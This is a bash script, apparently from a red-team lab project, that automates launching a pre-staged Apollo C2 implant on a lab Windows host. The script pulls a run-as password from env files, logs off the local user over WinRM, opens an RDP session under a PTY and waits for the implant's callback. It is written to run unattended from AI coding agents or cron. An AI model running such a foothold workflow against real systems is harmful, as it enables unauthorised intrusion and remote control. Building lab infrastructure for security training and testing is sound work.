#!/usr/bin/env bash
# Harness-agnostic ONE-COMMAND Apollo foothold launch — works identically for Codex, Claude Code's
# Bash tool, and unattended/cron runs. It opens the interactive Samwell RDP session under a
# self-allocated PTY (so it does NOT depend on the caller's shell having a controlling TTY), then
# starts the pre-staged Apollo via `launch-existing` and waits for the callback.
#
# Why this exists: `xfreerdp3`'s NTLM/NLA path dies pre-auth (exit 144) when it has no controlling
# terminal. Codex supplies one via tty:true; Claude Code / cron do not. `open_rdp_session.py` wraps
# xfreerdp3 in pty.fork() to give it its own controlling terminal regardless of the caller.
#
# The run-as password resolves durably (env -> ~/.config/sage/runas.env -> mythic .env) so a fresh,
# env-less shell still authenticates without an operator export.
#
# Usage:  launch_apollo_foothold.sh [target-ip] [run-as-user] [-- extra launch-existing args...]
#   e.g.  launch_apollo_foothold.sh 10.4.10.22 'NORTH\samwell.tarly'
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$HERE/../../.." && pwd)"
cd "$REPO"

TARGET_IP="${1:-10.4.10.22}"
RUN_AS="${2:-NORTH\\samwell.tarly}"
shift $(( $# >= 2 ? 2 : $# )) || true
[ "${1:-}" = "--" ] && shift || true

# Prefer an explicitly configured display. Otherwise select a live local display instead of assuming
# the historical :99 Xvfb still exists.
if [ -n "${SAGE_RDP_DISPLAY:-}" ]; then
  DISPLAY="$SAGE_RDP_DISPLAY"
elif pgrep -f '/Xwayland :0 ' >/dev/null && [ -S /tmp/.X11-unix/X0 ]; then
  DISPLAY=:0
elif pgrep -f 'Xvfb :99 ' >/dev/null && [ -S /tmp/.X11-unix/X99 ]; then
  DISPLAY=:99
else
  echo "launch_apollo_foothold: no live Xwayland :0 or Xvfb :99 display found" >&2
  exit 2
fi
export DISPLAY

if [ "$DISPLAY" = ":0" ] && [ -z "${XAUTHORITY:-}" ]; then
  XAUTHORITY="$(
    ps -eo args= | awk '
      $1 ~ /Xwayland$/ && $2 == ":0" {
        for (i = 1; i <= NF; i++) if ($i == "-auth" && i < NF) { print $(i + 1); exit }
      }
    '
  )"
  [ -n "$XAUTHORITY" ] && [ -f "$XAUTHORITY" ] || {
    echo "launch_apollo_foothold: could not resolve XAUTHORITY for Xwayland :0" >&2
    exit 2
  }
  export XAUTHORITY
fi

# Resolve the run-as password durably and export it so BOTH the RDP opener and launch-existing see it.
if [ -z "${SAGE_RUN_AS_PASSWORD:-}" ]; then
  for f in \
    "${SAGE_RUNAS_FILE:-}" \
    "$HOME/.config/sage/runas.env" \
    "$REPO/Payload_Type/sage/.env" \
    "${MYTHIC_ENV_PATH:-$HOME/dev/mythic_v4/.env}"
  do
    [ -n "$f" ] && [ -f "$f" ] || continue
    v="$(grep -E '^SAGE_RUN_AS_PASSWORD=' "$f" | head -1 | cut -d= -f2- | tr -d "\"'" || true)"
    [ -n "$v" ] && { export SAGE_RUN_AS_PASSWORD="$v"; break; }
  done
fi
if [ -z "${SAGE_RUN_AS_PASSWORD:-}" ]; then
  echo "launch_apollo_foothold: no run-as password — export SAGE_RUN_AS_PASSWORD or set it in Sage's .env or ~/.config/sage/runas.env" >&2
  exit 2
fi

# 1) Clear the snapshot's local console user before opening Samwell's RDP session. Retry while WinRM
#    finishes booting, but never log off any other account.
LOGOFF_LOG=/tmp/sage_localuser_logoff.log
for attempt in $(seq 1 30); do
  if "$REPO/.venv/bin/python" "$HERE/deploy_payload_via_ludus.py" logoff-user \
      --target-ip "$TARGET_IP" --username localuser >"$LOGOFF_LOG" 2>&1; then
    echo "Apollo foothold: localuser session cleared"
    break
  fi
  if [ "$attempt" -eq 30 ]; then
    cat "$LOGOFF_LOG" >&2
    echo "launch_apollo_foothold: localuser logoff failed after 300s" >&2
    exit 2
  fi
  sleep 10
done

# 2) Open the interactive RDP session under a PTY. A VM can report powered-on before its domain
#    controller can service NLA, so retry authentication instead of treating STATUS_NO_LOGON_SERVERS
#    as a terminal reset failure.
rdp_retry() {
  local attempt
  for attempt in $(seq 1 60); do
    if python3 "$HERE/open_rdp_session.py" --target-ip "$TARGET_IP" --run-as-user "$RUN_AS" \
        --display "$DISPLAY" --log /tmp/open_rdp_session.log; then
      return 0
    fi
    sleep 10
  done
  echo "launch_apollo_foothold: RDP authentication did not succeed within 600s" >&2
  return 2
}
rdp_retry &
RDP_PID=$!
cleanup(){ kill "$RDP_PID" 2>/dev/null || true; }
trap cleanup EXIT

# 3) Start the pre-staged Apollo and wait for the callback (launch-existing polls for the session,
#    starts SageApolloBootstrap, waits for check-in, then tsdiscon's the RDP).
"$REPO/.venv/bin/python" "$HERE/deploy_payload_via_ludus.py" launch-existing \
  --target-ip "$TARGET_IP" --run-as-user "$RUN_AS" \
  --wait-interactive-session-seconds 600 "$@"
